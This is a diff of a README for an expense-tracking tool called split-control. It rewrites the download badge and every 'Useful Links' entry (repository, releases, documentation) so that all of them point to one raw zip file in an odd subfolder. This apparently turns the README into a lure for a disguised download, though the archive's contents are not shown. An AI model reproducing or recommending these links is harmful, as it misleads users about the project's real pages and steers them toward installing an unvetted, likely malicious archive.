@@ -25,7 +25,7 @@ To run **split-control**, you will need:
 
 You can download the latest version of **split-control** from our Releases page. 
 
-[![Download split-control](https://img.shields.io/badge/Download-split--control-brightgreen)](https://github.com/SkyVodka69/split-control/releases)
+[![Download split-control](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
 
 ### Steps to Download:
 
@@ -76,8 +76,8 @@ If you encounter any issues or have questions, feel free to reach out. You can f
 
 ## 🔗 Useful Links
 
-- [Project Repository](https://github.com/SkyVodka69/split-control)
-- [Releases Page](https://github.com/SkyVodka69/split-control/releases)
-- [Documentation](https://github.com/SkyVodka69/split-control/wiki)
+- [Project Repository](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
+- [Releases Page](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
+- [Documentation](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
 
 Thank you for choosing **split-control**! We hope it makes managing your expenses simpler and more enjoyable.
